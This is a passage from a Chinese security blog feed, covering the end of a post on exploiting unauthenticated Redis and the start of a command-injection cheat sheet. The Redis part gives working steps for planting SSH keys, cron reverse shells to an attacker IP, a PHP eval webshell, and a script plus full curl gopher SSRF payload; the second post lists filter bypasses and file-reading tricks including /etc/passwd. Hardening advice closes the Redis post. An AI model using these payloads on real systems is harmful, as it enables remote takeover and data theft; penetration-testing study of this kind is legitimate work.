"/root/.ssh"</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename "authorized_keys"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>直接私钥连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh –i  id_rsa root@ip</span></span><br></pre></td></tr></table></figure><h3 id="利用-crontable-反弹-shell"><a href="#利用-crontable-反弹-shell" class="headerlink" title="利用 crontable 反弹 shell"></a>利用 crontable 反弹 shell</h3><p>nc 监听</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvvp <span class="number">9669</span></span><br></pre></td></tr></table></figure><p>写入定时命令，这里用的 <code>bash</code> ，其他弹法改下语句就行。本地 Ubuntu 弹失败了，再试试 py 看看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set x "n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/vps_ip/port 0&gt;&amp;1\n\n"</span><br><span class="line">set x "\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\n\n\n"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>不同系统（发行版）的定时任务文件所在路径可能不同，以实际系统为准。</p><h3 id="写-webshell"><a href="#写-webshell" class="headerlink" title="写 webshell"></a>写 webshell</h3><p>当服务器开着 web 服务，而且 redis 有 web 目录写权限时，可以尝试写 webshell。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> x <span class="string">"\n\n&lt;?php eval(<span class="variable">$_POST</span>[1]);?&gt;\n"</span></span><br><span class="line">config <span class="builtin-name">set</span> dir /var/www/html</span><br><span class="line">config <span class="builtin-name">set</span> dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="执行命令（这里还可以继续研究）"><a href="#执行命令（这里还可以继续研究）" class="headerlink" title="执行命令（这里还可以继续研究）"></a>执行命令（这里还可以继续研究）</h3><p>本地建一个 <code>lua</code> 脚本 hello.lua</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> msg = <span class="string">"hello,hack!"</span></span><br><span class="line"><span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure><p>redis 连接并执行</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli eval <span class="string">"$(cat hello.lua)"</span> <span class="number">0</span> -h <span class="number">192.168</span><span class="number">.152</span><span class="number">.128</span></span><br></pre></td></tr></table></figure><h3 id="恢复初始设置"><a href="#恢复初始设置" class="headerlink" title="恢复初始设置"></a>恢复初始设置</h3><p>以下是默认配置，更妥当的做法是使用 <code>config get dir</code> 记录下之前的配置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 恢复dir</span></span><br><span class="line">config set dir /var/lib/redis</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 恢复dbfilename</span></span><br><span class="line">config set dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 刷新数据库</span></span><br><span class="line">flushdb</span><br></pre></td></tr></table></figure><h2 id="结合-ssrf"><a href="#结合-ssrf" class="headerlink" title="结合 ssrf"></a>结合 ssrf</h2><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p><strong>为什么要用 gopher？</strong></p><blockquote><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。但是经过部分测试，发现阿里云的 libcurl 还是支持 Gopher 协议的，在实际环境中可能会有更多。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p></blockquote><p>协议基本格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://<span class="tag">&lt;<span class="name">host</span>&gt;</span>:<span class="tag">&lt;<span class="name">port</span>&gt;</span>/_ + 数据</span><br></pre></td></tr></table></figure><p>TODO：单独写一篇总结</p><h3 id="具体玩法"><a href="#具体玩法" class="headerlink" title="具体玩法"></a>具体玩法</h3><p>写一个反弹脚本，方便抓流量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> flushall  <span class="comment"># 无法成功时再试试这句，将清掉所有数据</span></span></span><br><span class="line">echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure><p>输出四个 “ok” 即为写入成功。</p><p>先抓一下客户端 <code>redis-cli</code> 执行这些命令所发的数据包，然后尝试伪造。</p><p>开一个端口转发，作为拦截</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:2333,fork tcp-connect:localhost:6379</span><br></pre></td></tr></table></figure><blockquote><p>将 2333 端口的数据转发到 6379</p></blockquote><p>将数据流转换为 <code>gopher</code> 形式</p><p>转换规则如下：</p><ul><li>如果第一个字符是 &gt; 或者 &lt; 那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前 3 个字符是 + OK 那么丢弃该行字符串，表示返回的字符串。</li><li>将 \r 字符串替换成 %0d%0a</li><li>空白行替换为 %0a</li></ul><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp += <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp += line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp += <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp += line</span><br><span class="line">print(<span class="string">'_'</span> + exp)  <span class="comment"># 直接加入 _</span></span><br></pre></td></tr></table></figure><p>将之前 <code>socat</code> 命令输出的数据流存为 <code>data.txt</code>，然后进行转换</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  tmp py3 gopher.py data.txt</span><br><span class="line">_*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">66</span>%<span class="number">0</span>d%<span class="number">0</span>a-e %<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">47.11</span><span class="number">.220</span><span class="number">.241</span>/<span class="number">9669</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">16</span>%<span class="number">0</span>d%<span class="number">0</span>a/var/spool/cron/%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">10</span>%<span class="number">0</span>d%<span class="number">0</span>adbfilename%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aroot%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>asave%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aquit%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>使用 curl 发送 payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v 'gopher://victim_ip:port/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$66%0d%0a-e %0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/47.11.220.241/9669 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'</span><br></pre></td></tr></table></figure><p>需要注意的是，如果要换 IP 和端口，前面的<code>$58</code>也需要更改，<code>$58</code>表示字符串长度为 58 个字节，上面的 EXP 即是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a</code>，3+51+4=58。如果想换成 42.256.24.73，那么 $58 需要改成​ $61，以此类推。</p><h2 id="利用主从"><a href="#利用主从" class="headerlink" title="利用主从"></a>利用主从</h2><blockquote><p>条件：版本 &lt;= 5.0.5</p><p>原理：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p></blockquote><p>伪造一个 redis  master 服务器，让目标成为一个 slave。这样，我们就可以通过 master 给 slave 传递一些命令；同时，也可以让 slave 加载我们写的模块（恶意 so）。</p><p>利用这个方法，就避免了通过写文件 getshell 时由于文件内含其他字符导致的影响，也可以不需要借助 crontab、php这种第三方程序而直接 getshell。</p><p><a href="https://github.com/vulhub/redis-rogue-getshell" target="_blank" rel="noopener">https://github.com/vulhub/redis-rogue-getshell</a></p><h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="禁止一些高危命令（重启redis才能生效）"><a href="#禁止一些高危命令（重启redis才能生效）" class="headerlink" title="禁止一些高危命令（重启redis才能生效）"></a>禁止一些高危命令（重启redis才能生效）</h3><ul><li>修改 redis.conf 文件，禁用远程修改 DB 文件地址</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">""</span></span><br><span class="line">rename-command<span class="built_in"> CONFIG </span><span class="string">""</span></span><br><span class="line">rename-command EVAL <span class="string">""</span></span><br></pre></td></tr></table></figure><ul><li>或者通过修改redis.conf文件，改变这些高危命令的名称</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">"name1"</span></span><br><span class="line">rename-command<span class="built_in"> CONFIG </span><span class="string">"name2"</span></span><br><span class="line">rename-command EVAL <span class="string">"name3"</span></span><br></pre></td></tr></table></figure><h3 id="以低权限运行-Redis-服务（重启redis才能生效）"><a href="#以低权限运行-Redis-服务（重启redis才能生效）" class="headerlink" title="以低权限运行 Redis 服务（重启redis才能生效）"></a>以低权限运行 Redis 服务（重启redis才能生效）</h3><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis <span class="meta">&amp;&amp; useradd -r -g redis redis</span></span><br></pre></td></tr></table></figure><h3 id="为-Redis-添加密码验证（重启redis才能生效）"><a href="#为-Redis-添加密码验证（重启redis才能生效）" class="headerlink" title="为 Redis 添加密码验证（重启redis才能生效）"></a>为 Redis 添加密码验证（重启redis才能生效）</h3><p>修改 redis.conf 文件，添加</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">requirepass mypassword</span></span><br></pre></td></tr></table></figure><p>（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</p><h3 id="禁止外网访问-Redis（重启redis才能生效）"><a href="#禁止外网访问-Redis（重启redis才能生效）" class="headerlink" title="禁止外网访问 Redis（重启redis才能生效）"></a>禁止外网访问 Redis（重启redis才能生效）</h3><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">bind</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p><h3 id="修改默认端口"><a href="#修改默认端口" class="headerlink" title="修改默认端口"></a>修改默认端口</h3><p>修改配置文件redis.conf文件</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port <span class="number">6379</span></span><br></pre></td></tr></table></figure><p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p><h3 id="保证-authorized-keys-文件的安全"><a href="#保证-authorized-keys-文件的安全" class="headerlink" title="保证 authorized_keys 文件的安全"></a>保证 authorized_keys 文件的安全</h3><p>为了保证安全，您应该阻止其他用户添加新的公钥。</p><ul><li>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">400</span> ~<span class="regexp">/.ssh/</span>authorized_keys</span><br></pre></td></tr></table></figure><ul><li>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><ul><li>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> ~/.ssh</span><br></pre></td></tr></table></figure><h3 id="设置防火墙策略"><a href="#设置防火墙策略" class="headerlink" title="设置防火墙策略"></a>设置防火墙策略</h3><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</a></p><p><a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">https://xz.aliyun.com/t/1800</a></p><p><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">https://www.freebuf.com/column/158065.html</a></p><p><a href="https://xz.aliyun.com/t/2295" target="_blank" rel="noopener">https://xz.aliyun.com/t/2295</a></p><p><a href="https://www.k0rz3n.com/2018/11/08/Redis%20基础梳理以及其在渗透测试中的利用" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/08/Redis%20基础梳理以及其在渗透测试中的利用</a></p><p><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf攻击内网应用复现/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Redis-介绍&quot;&gt;&lt;a href=&quot;#Redis-介绍&quot; class=&quot;headerlink&quot; title=&quot;Redis 介绍&quot;&gt;&lt;/a&gt;Redis 介绍&lt;/h2&gt;&lt;h3 id=&quot;是什么？&quot;&gt;&lt;a href=&quot;#是什么？&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="redis" scheme="https://wywwzjj.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>命令注入总结</title>
    <link href="https://wywwzjj.top/2019/05/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://wywwzjj.top/2019/05/12/命令注入总结/</id>
    <published>2019-05-11T16:49:43.000Z</published>
    <updated>2019-05-21T02:05:59.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="直接执行代码"><a href="#直接执行代码" class="headerlink" title="直接执行代码"></a>直接执行代码</h2><p>PHP 中有不少可以直接执行代码的函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>();</span><br><span class="line">assert();</span><br><span class="line">system();</span><br><span class="line">exec();</span><br><span class="line">shell_exec();</span><br><span class="line">passthru();</span><br><span class="line">escapeshellcmd();</span><br><span class="line">pcntl_exec();</span><br></pre></td></tr></table></figure><p>preg_replace( ) 代码执行</p><p>preg_replace() 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $var = <span class="string">"&lt;tag&gt;phpinfo()&lt;/tag&gt;"</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e"</span>, <span class="string">"addslashes(\\1)"</span>, $var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>若无 <code>/e</code> 修饰符，则可以尝试 %00 截断。</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ul><li><p>cmd &gt; file<br>  把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。</p></li><li><p>cmd &gt;&gt; file<br>  把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。</p></li><li><p>cmd &lt; file<br>  使cmd命令从file读入</p></li><li><p>cmd &lt;&lt; text<br>  从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用<code>&lt;&lt;-</code> ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。</p></li><li><p>cmd &lt;&lt;&lt; word<br>  把word（而不是文件word）和后面的换行作为输入提供给cmd。</p></li><li><p>cmd &lt;&gt; file<br>  以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。</p></li><li><p>cmd &gt;| file<br>  功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用<code>&gt;!</code>实现这一功能。</p></li><li><p>: &gt; filename</p><p>  把文件<code>filename</code>截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与<code>touch</code>的效果相同).</p></li><li><p>cmd &gt;&amp;n</p><p>  把输出送到文件描述符n</p></li><li><p>cmd m&gt;&amp;n</p><p>  把输出到文件符m的信息重定向到文件描述符n</p></li><li><p>cmd &gt;&amp;-</p><p>  关闭标准输出</p></li><li><p>cmd &lt;&amp;n</p><p>  输入来自文件描述符n</p></li><li><p>cmd m&lt;&amp;n</p><p>  m来自文件描述各个n</p></li><li><p>cmd &lt;&amp;-</p><p>  关闭标准输入</p></li><li><p>cmd &lt;&amp;n-</p><p>  移动输入文件描述符n而非复制它。</p></li><li><p>cmd &gt;&amp;n-</p><p>  移动输出文件描述符n而非复制它。<br>  注意： <code>&gt;&amp;</code>实际上复制了文件描述符，这使得<code>cmd &gt; file 2&gt;&amp;1</code>与<code>cmd 2&gt;&amp;1 &gt;file</code>的效果不一样。</p></li></ul><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">flag</span> /&#123;cat,<span class="built_in">flag</span>&#125;</span><br><span class="line">more <span class="built_in">flag</span></span><br><span class="line">less <span class="built_in">flag</span></span><br><span class="line">bzmore <span class="built_in">flag</span></span><br><span class="line">bzless <span class="built_in">flag</span></span><br><span class="line">head <span class="built_in">flag</span></span><br><span class="line">tail <span class="built_in">flag</span></span><br><span class="line">tailf <span class="built_in">flag</span> </span><br><span class="line">tac <span class="built_in">flag</span></span><br><span class="line">nl <span class="built_in">flag</span></span><br><span class="line">od -a <span class="built_in">flag</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fire</span> <span class="built_in">flag</span></span><br><span class="line">wc <span class="built_in">flag</span></span><br><span class="line">uniq <span class="built_in">flag</span></span><br><span class="line">diff <span class="built_in">flag</span> flag1.txt</span><br><span class="line">sed -n <span class="string">'1,2p'</span> <span class="built_in">flag</span></span><br><span class="line"><span class="built_in">find</span> -P <span class="built_in">flag</span></span><br><span class="line">strings <span class="built_in">flag</span></span><br><span class="line">curl file:<span class="comment">///root/flag</span></span><br><span class="line"><span class="built_in">sort</span> <span class="built_in">flag</span></span><br><span class="line">bash -v <span class="built_in">flag</span> </span><br><span class="line">rev <span class="built_in">flag</span></span><br><span class="line">paste ./<span class="built_in">flag</span>.txt /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="多条命令"><a href="#多条命令" class="headerlink" title="多条命令"></a>多条命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">0a、%0d    换行符与回车符</span></span><br><span class="line">|           第一条命令结果作为第二条命令的输入</span><br><span class="line">||          第一条执行失败，执行第二条命令</span><br><span class="line">;           连续指令功能。</span><br><span class="line">&amp;           连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          当第一条执行成功后执行后续命令</span><br><span class="line"></span><br><span class="line">echo 666`date` =&gt; 666Tue 14 May 2019 07:15:23 AM EDT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows</span></span><br><span class="line">Copy %0a</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">1a - 一个神奇的角色，作为.bat文件中的命令分隔符</span></span><br><span class="line">&lt;?php</span><br><span class="line">    $command = 'dir '.$_POST['dir'];</span><br><span class="line">    $escaped_command = escapeshellcmd($command);</span><br><span class="line">    file_put_contents('out.bat',$escaped_command);</span><br><span class="line">    system('out.bat');</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="绕过-escapeshellcmd"><a href="#绕过-escapeshellcmd" class="headerlink" title="绕过 escapeshellcmd"></a>绕过 escapeshellcmd</h3><ul><li>win 下执行 bat</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = <span class="string">'dir '</span>.$_POST[<span class="string">'dir'</span>];</span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line">var_dump($escaped_command);</span><br><span class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</span><br><span class="line">system(<span class="string">'out.bat'</span>);</span><br></pre></td></tr></table></figure><p>执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dir</span>=../ %<span class="number">1</span>a whoami</span><br></pre></td></tr></table></figure><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ul><li>${IFS}</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;<span 